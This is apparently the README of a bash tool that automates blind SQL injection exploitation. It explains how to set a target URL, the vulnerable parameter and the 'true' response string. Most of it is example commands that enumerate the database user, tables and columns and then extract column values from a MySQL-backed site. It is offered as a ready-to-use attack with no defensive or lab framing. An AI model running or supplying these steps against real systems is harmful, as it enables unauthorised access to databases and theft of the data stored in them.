# Script-for-exploiting-Blind-SQL-injection

This is a bash script made for automating the exploitation of Blind SQL Injection Vulnerabilities

<h3>HIGLY RECOMMENDED TO MAKE THE QUERY "@@version" TO SEE WHICH IS THE DATABASE VERSION TO SEND THE APPROPIATE QUERYS</h3>

<h1>FOR blindSQLi.sh:</h1>

  CHANGE THE URL ON THE 5th line for the one that you want to use

  CHANGE THE ?band=the offspring' of the 20th line for "? the vulnerable parameter=Xvalue' "
  
  CHANGE THE truestring variable for the string you obtain when a normal query is well done.

<h3>Examples of use with MySQL queries:</h3>

```
bash blindSQLi.sh 20 "Select user()"
bash blindSQLi.sh 20 "Select database()" #show the actual database

bash blindSQLi.sh 20 "SELECT table_name FROM information_schema.tables WHERE table_schema='DATABASEname' limit 0,1 " #show 1st table name of a database
bash blindSQLi.sh 20 "SELECT table_name FROM information_schema.tables WHERE table_schema='DATABASEname' limit 1,1 " #show 2nd table name of a database, and so on...

bash blindSQLi.sh 20 "SELECT column_name FROM information_schema.columns WHERE table_name='TABLEname' limit 0,1 " #show the 1st column name of a table.
bash blindSQLi.sh 20 "SELECT column_name FROM information_schema.columns WHERE table_name='TABLEname' limit 1,1 " #show the 2nd column name of a table and so on...

bash blindSQLi.sh 30 "SELECT concat(COLUMN1, '---', COLUMN2) FROM TABLEname limit 0,1 " #extract the 1st value of 2 columns from a table.
bash blindSQLi.sh 30 "SELECT concat(COLUMN1, '---', COLUMN2, '---', COLUMN3) FROM TABLEname limit 1,1 " #extract the 2nd value of 3 columns from a table and so on...
```

Where 20 is maximum of characters we expect from the response and what's inside the quotes is the query that you want to do.

You can use a query cheatsheet like the ones that are in the PentestMonkey webpage.
